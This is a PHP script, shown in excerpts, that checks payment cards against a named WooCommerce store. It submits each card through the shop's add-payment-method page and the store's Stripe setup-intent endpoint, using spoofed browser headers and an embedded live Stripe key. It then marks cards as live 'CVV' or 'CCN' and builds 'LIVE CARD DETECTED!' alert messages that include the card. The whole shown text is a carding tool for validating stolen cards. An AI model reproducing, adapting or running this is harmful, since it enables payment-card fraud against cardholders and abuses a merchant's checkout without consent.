...
$get_url = "https://sissylover.com/my-account/";
...
$create_url = "https://sissylover.com/my-account/";
...
$create_headers = [
    ...
    "priority: u=0, i",
    "referer: https://sissylover.com/my-account/",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
...
$create_data = http_build_query([
    ...
    "wc_order_attribution_session_entry" => "https://sissylover.com/my-account/payment-methods/",
    "wc_order_attribution_session_start_time" => "2025-04-14 12:25:39",
...
$pay_url = "https://sissylover.com/my-account/add-payment-method/";
...
$cseti_url = "https://sissylover.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent";
...
if ($securestate === 'requires_action') {
    ...
    if (($state == "succeeded") || ($state == "attempted") || ($state == "processing_error")){
        ...
        $get_url = "https://api.stripe.com/v1/setup_intents/{$cintent}?is_stripe_sdk=false&client_secret={$csecret}&key=pk_live_518G6HgBRoi4Zakzj7hzizB84DJGzRPWHatOPXSic41SmKx32hRXNCGhc4jKVLOT5zAcTBc8tiJxko1hW8ofjOg0r00E2xH7YBP";
        ...
        if($status == "succeeded"){
            echo '<span class="text text-success">CVV</span> <span class="text text-success">➔ '.$card.' ➔ Payment method added. (CVV AUTH)</span><br>';
            ...
            echo '<span class="text text-warning">CCN</span> <span class="text text-warning">➔ '.$card.' ➔ '.$message.' ('.$state.')</span><br>'; 
            $message = "🔊<b>LIVE CARD DETECTED!</b>\n" .
            "✉️ <b>CARD:</b> $card\n" .
    ...
    if ($securestate === 'succeeded') {
        ...
        echo '<span class="text text-warning">CCN</span> <span class="text text-warning">➔ '.$card.' ➔ incorrect_cvc</span><br>';
        $message = "🔊<b>LIVE CARD DETECTED!</b>\n" .
        "✉️ <b>CARD:</b> $card\n" .
        "🔍 <b>STATUS:</b> Payment method added (CCN)\n\n" .
        "ℹ️ <b>🧾 Payment Details</b>\n" .
